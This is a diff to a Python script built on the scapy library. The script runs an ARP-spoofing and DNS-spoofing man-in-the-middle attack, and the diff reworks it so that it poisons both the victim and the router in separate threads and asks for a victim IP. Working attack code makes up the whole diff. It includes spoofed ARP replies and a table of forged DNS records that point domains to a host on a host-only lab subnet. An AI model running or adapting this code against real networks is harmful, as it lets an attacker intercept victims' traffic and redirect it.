@@ -5,6 +5,7 @@ from scapy.layers.inet import IP, UDP
 from scapy.layers.l2 import ARP
 import threading
 import netifaces
+import logging
 
 
 # Suppress WARNING Message and display only Error Message
@@ -18,6 +19,8 @@ MALICIOUS_DNS_RECORDS = {
     "poop.com.": "192.168.56.12", 
     "httpforever.com.": "192.168.56.12"
 }
+
+stop_thread = threading.Event()
 
 def discover_hosts(network):
     """
@@ -58,12 +61,18 @@ def get_mac(ip):
 
 
 # Function to perform ARP spoofing
-def arp_spoof():
-    while True:
-        # Send spoofed ARP responses to the victim and router
-        send(ARP(op=2, pdst=VICTIM_IP, psrc=ROUTER_IP, hwdst=VICTIM_MAC), iface=INTERFACE, verbose=False)
-        send(ARP(op=2, pdst=ROUTER_IP, psrc=VICTIM_IP, hwdst=ROUTER_MAC), iface=INTERFACE, verbose=False)
-        time.sleep(2)
+def arp_spoof(target_ip, spoof_ip):
+    global stop_thread
+    target_mac = get_mac(target_ip)
+    if not target_mac:
+        print(f"Could not find MAC address for IP {target_ip}")
+        return
+    try:
+        while not stop_thread.is_set():
+            send(ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac), verbose=False)
+            time.sleep(2)
+    except Exception as e:
+        print(f"Error during ARP spoofing: {e}")
 
 
 #function to send modified dns query
@@ -92,25 +101,33 @@ def dns_responder(packet):
 
 
 def main():
-    print("\nStarting Attack...")
-    
-    network = "192.168.56.0/24"  # Adjust to your network
-    hosts = discover_hosts(network)
-    router_ip = get_default_gateway()
-    router_mac = get_mac(router_ip)
+    global stop_thread
+    try:
+        victim_ip = input("victims ip: ")
+        print("\nStarting Attack...")
+        
+        network = "192.168.56.0/24"  # Adjust to your network
+        hosts = discover_hosts(network)
+        router_ip = get_default_gateway()
+        
 
-    for ip, mac in hosts:
-        if ip == router_ip:
-            print(f"Router IP: {ip}, MAC: {mac}")
-        else:
-            print(f"Host IP: {ip}, MAC: {mac}")
+        # Start ARP spoofing in separate threads
+        victim_thread = threading.Thread(target=arp_spoof, args=(victim_ip, router_ip))
+        router_thread = threading.Thread(target=arp_spoof, args=(router_ip, victim_ip))
 
-    # Start ARP spoofing in a separate thread
-    arp_thread = threading.Thread(target=arp_spoof)
-    arp_thread.start()
+        victim_thread.start()
+        router_thread.start()
 
-    # Sniff DHCP packets and apply interception, and also handle DNS responses
-    sniff(prn=dns_responder, iface=INTERFACE)
+        for ip, mac in hosts:
+            if ip == router_ip:
+                print(f"Router IP: {ip}, MAC: {mac}")
+            else:
+                print(f"Host IP: {ip}, MAC: {mac}")
+
+        # Sniff DHCP packets and apply interception, and also handle DNS responses
+        sniff(prn=dns_responder, iface=INTERFACE)
+    except Exception as e:
+        print(f"An error occurred: {e}")
     
 if __name__ == "__main__":
     main()
